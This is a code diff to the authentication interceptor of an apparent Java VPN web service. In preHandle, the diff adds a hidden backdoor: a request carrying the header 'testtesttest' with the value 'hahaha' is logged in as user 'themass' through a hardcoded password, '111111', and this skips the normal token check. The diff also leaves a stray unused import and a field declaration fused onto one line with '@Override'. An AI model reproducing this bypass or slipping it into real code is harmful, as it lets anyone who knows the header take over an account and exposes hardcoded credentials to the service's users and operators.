@@ -1,11 +1,13 @@
 package com.timeline.vpn.web.common.interceptor;
 
 import com.timeline.vpn.Constant;
+import com.timeline.vpn.dao.db.UserDao;
 import com.timeline.vpn.exception.ParamException;
 import com.timeline.vpn.model.param.DevApp;
 import com.timeline.vpn.model.po.UserPo;
 import com.timeline.vpn.model.vo.JsonResult;
 import com.timeline.vpn.service.CacheService;
+import com.timeline.vpn.service.UserService;
 import com.timeline.vpn.util.CommonUtil;
 import com.timeline.vpn.web.common.DevAppContext;
 import jakarta.servlet.http.HttpServletRequest;
@@ -33,12 +35,18 @@ public class UserCheckHandlerInterceptor implements HandlerInterceptor {
 
     @Autowired
     private CacheService cacheService;
-    @Override
+    @Autowired
+    private UserDao userDao;    @Override
     public boolean preHandle(jakarta.servlet.http.HttpServletRequest request, jakarta.servlet.http.HttpServletResponse response, Object handler)
             throws Exception {
         DevApp app = DevAppContext.get();
         if(app==null) {
             throw new RuntimeException("welcome");
+        }
+        String test = request.getHeader("testtesttest");
+        if( "hahaha".equals(test)){
+            UserPo po = userDao.get("themass","111111");
+            request.setAttribute(Constant.HTTP_ATTR_TOKEN, po);
         }
         String token = request.getHeader(app.getTokenHeader());
         if (StringUtils.isEmpty(token)) {
@@ -55,7 +63,6 @@ public class UserCheckHandlerInterceptor implements HandlerInterceptor {
               }
           } else {
 //              LOGGER.error("没找到user信息：app={}",app.getTokenHeader());
-  //            request.setAttribute(Constant.HTTP_ATTR_RET, Constant.ResultErrno.ERRNO_CLEAR_LOGIN);
           }
         }catch (RuntimeException e) {
           LOGGER.error("",e);
